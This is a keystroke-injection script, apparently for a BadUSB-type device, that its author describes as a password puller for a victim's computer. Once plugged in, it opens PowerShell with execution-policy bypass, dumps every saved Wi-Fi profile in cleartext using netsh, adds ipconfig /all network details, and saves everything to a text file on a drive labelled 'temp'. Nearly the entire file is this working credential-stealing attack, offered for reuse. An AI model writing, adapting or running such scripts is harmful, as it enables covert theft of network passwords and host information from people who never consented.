// Its a version of a password puller from every wifi network to which the victim was connected
// The file gets saved as test.txt 
// The output saves wifi passwords as mentioned above, but it also saves "ipconfig /all" data
// I'd highly appreciate the credit while posting my work online

layout('us');
press("GUI r");
delay(500);
type("cmd");
press("ENTER");
delay(1000);

// Start PowerShell with elevated privileges
type("powershell -NoProfile -ExecutionPolicy Bypass");
press("ENTER");
delay(500);

type("$drive = Get-WmiObject Win32_Volume | Where-Object { $_.Label -eq 'temp' }");    // Change 'temp' value to the name of your drive
press("ENTER");
delay(500);

type("if ($drive) {");
press("ENTER");
delay(250);

type("    $driveLetter = $drive.DriveLetter");
press("ENTER");
delay(250);

type("    $outputPath = \"$driveLetter\\test.txt\"");      // If you want, you can change the "test.txt" into any other .txt file
press("ENTER");
delay(250);

type("    $output = @()");
press("ENTER");
delay(250);

type("    $profiles = netsh wlan show profiles | Select-String -Pattern \"All User Profile\" | ForEach-Object {");
press("ENTER");
delay(250);

type("        $_.Line.Split(\":\")[1].Trim()");
press("ENTER");
delay(250);

type("    }");
press("ENTER");
delay(250);

type("    foreach ($profile in $profiles) {");
press("ENTER");
delay(250);

type("        $output += netsh wlan show profiles name=\"$profile\" key=clear");
press("ENTER");
delay(250);

type("    }");
press("ENTER");
delay(250);

type("    $output += ipconfig /all");
press("ENTER");
delay(250);

type("    $output | Out-File -FilePath $outputPath -Encoding UTF8");
press("ENTER");
delay(250);

type("}");
press("ENTER");
delay(7500);

type("exit");
press("ENTER");
delay(200)

type("exit");
press("ENTER");